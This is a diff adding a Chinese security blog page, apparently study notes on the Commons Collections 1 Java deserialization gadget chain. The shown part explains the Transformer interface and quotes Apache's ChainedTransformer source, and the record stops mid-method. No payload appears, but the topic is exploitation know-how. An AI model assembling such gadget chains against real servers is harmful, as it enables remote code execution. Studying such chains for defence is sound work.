@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="xiaolu-cmd">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://xiaolu-cmd.github.io/2026/11/01/cc1-transformedmap/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="网络安全学习笔记，以及一些有趣的发现。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cc1链学习">
+<meta property="og:url" content="https://xiaolu-cmd.github.io/2026/11/01/cc1-transformedmap/index.html">
+<meta property="og:site_name" content="xiaolu-cmd&#39;s Blog">
+<meta property="og:description" content="网络安全学习笔记，以及一些有趣的发现。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiaolu-cmd.github.io/assets/hero.webp">
+<meta property="article:published_time" content="2026-11-01T13:30:09.000Z">
+<meta property="article:modified_time" content="2026-11-01T13:30:09.000Z">
+<meta property="article:author" content="xiaolu-cmd">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="CC1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiaolu-cmd.github.io/assets/hero.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/assets/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.png">
+    <meta name="theme-color" content="#447f9e">
+    <link rel="shortcut icon" href="/assets/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            cc1链学习 | xiaolu-cmd&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <link rel="stylesheet" href="/assets/custom.css">
+            
+    
+            
+                
+                    <link rel="preload" as="image" href="/assets/hero.webp" fetchpriority="high">
+            
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"xiaolu-cmd.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"17px","line_height":1.85,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#447f9e","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1080px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":false,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/assets/hero.webp","description":"网络安全学习笔记，以及一些有趣的发现。"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"static","image":{"light":"/assets/hero.webp","dark":"/assets/hero.webp"},"title":"保持好奇，持续探索。","subtitle":{"text":["网络安全 · 学习笔记 · 有趣的发现"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":70,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#ffffff"},"text_style":{"title_size":"3.6rem","subtitle_size":"1.15rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/xiaolu-cmd"},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#24384c","right":"#447f9e","transparency":60},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-solid fa-house"},"Archives":{"path":"/archives/","icon":"fa-solid fa-box-archive"},"About":{"path":"/about/","icon":"fa-solid fa-user"}},"search":{"enable":true,"preload":false}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":false,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD","excerpt_length":110,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":false,"icon":"<i class=\"fa-solid fa-mountain-sun\"></i>","start":"2025/07/16 16:20:45","statistics":false,"customize":"记录探索，保持好奇。","icp":{"enable":false,"number":null,"url":null}},"footerStart":"2025/07/16 16:20:45","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                xiaolu-cmd&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-solid fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-solid fa-box-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-solid fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-solid fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-solid fa-box-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">cc1链学习</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/assets/avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">xiaolu-cmd</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-11-01 21:30:09</span>
+        <span class="mobile">2026-11-01 21:30:09</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-11-01 21:30:09</span>
+            <span class="mobile">2026-11-01 21:30:09</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">安全学习</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java 反序列化</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CC1/">CC1</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="从-Transformer-接口入手"><a href="#从-Transformer-接口入手" class="headerlink" title="从 Transformer 接口入手"></a>从 Transformer 接口入手</h2><p>根据前人挖洞的审核，我们从Transformer这个接口入口，我们发现这个这个接口很简单，输入一个内容然后执行方法</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Transforms the input object (leaving it unchanged) into some output object.     *     * <span class="hljs-doctag">@param</span> input  the object to be transformed, should be left unchanged  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> a transformed object  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+<p>我们查找这个接口的具体实现类，我们发现有很多，先看chain的类</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */</span><span class="hljs-keyword">package</span> org.apache.commons.collections.functors;  <br>  <br><span class="hljs-keyword">import</span> java.io.Serializable;  <br><span class="hljs-keyword">import</span> java.util.Collection;  <br><span class="hljs-keyword">import</span> java.util.Iterator;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br>  <br><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * Transformer implementation that chains the specified transformers together. * &lt;p&gt;  </span><br><span class="hljs-comment"> * The input object is passed to the first transformer. The transformed result  </span><br><span class="hljs-comment"> * is passed to the second transformer and so on. ** <span class="hljs-doctag">@since</span> Commons Collections 3.0  </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  </span><br><span class="hljs-comment"> * * <span class="hljs-doctag">@author</span> Stephen Colebourne  </span><br><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;  <br>  <br>    <span class="hljs-comment">/** Serial version UID */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3514945074733160196L</span>;  <br>  <br>    <span class="hljs-comment">/** The transformers to call in turn */</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Factory method that performs validation and copies the parameter array.     ** <span class="hljs-doctag">@param</span> transformers  the transformers to chain, copied, no nulls  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the &lt;code&gt;chained&lt;/code&gt; transformer  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the transformers array is null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if any transformer in the array is null  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Transformer</span> <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;  <br>        FunctorUtils.validate(transformers);  <br>        <span class="hljs-keyword">if</span> (transformers.length == <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-keyword">return</span> NOPTransformer.INSTANCE;  <br>        &#125;  <br>        transformers = FunctorUtils.copy(transformers);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>    &#125;  <br>      <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Create a new Transformer that calls each transformer in turn, passing the     * result into the next transformer. The ordering is that of the iterator()  </span><br><span class="hljs-comment">     * method on the collection.     ** <span class="hljs-doctag">@param</span> transformers  a collection of transformers to chain  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the &lt;code&gt;chained&lt;/code&gt; transformer  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the transformers collection is null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if any transformer in the collection is null  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Transformer</span> <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Collection transformers)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (transformers == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Transformer collection must not be null&quot;</span>);  <br>        &#125;  <br>        <span class="hljs-keyword">if</span> (transformers.size() == <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-keyword">return</span> NOPTransformer.INSTANCE;  <br>        &#125;  <br>        <span class="hljs-comment">// convert to array like this to guarantee iterator() ordering  </span><br>        <span class="hljs-type">Transformer</span>[] <span class="hljs-variable">cmds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[transformers.size()];  <br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> transformers.iterator(); it.hasNext();) &#123;  <br>            cmds[i++] = (Transformer) it.next();  <br>        &#125;  <br>        FunctorUtils.validate(cmds);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(cmds);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Factory method that performs validation.     ** <span class="hljs-doctag">@param</span> transformer1  the first transformer, not null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformer2  the second transformer, not null  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the &lt;code&gt;chained&lt;/code&gt; transformer  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if either transformer is null  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Transformer</span> <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Transformer transformer1, Transformer transformer2)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (transformer1 == <span class="hljs-literal">null</span> || transformer2 == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Transformers must not be null&quot;</span>);  <br>        &#125;  <br>        <span class="hljs-type">Transformer</span>[] <span class="hljs-variable">transformers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; transformer1, transformer2 &#125;;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.  </span><br><span class="hljs-comment">     ** <span class="hljs-doctag">@param</span> transformers  the transformers to chain, not copied, no nulls  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-type">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;  <br>        <span class="hljs-built_in">super</span>();  <br>        iTransformers = transformers;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment">     * Transforms the input to result via each decorated transformer     ** <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer  </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformed result  </span><br><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;  <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> 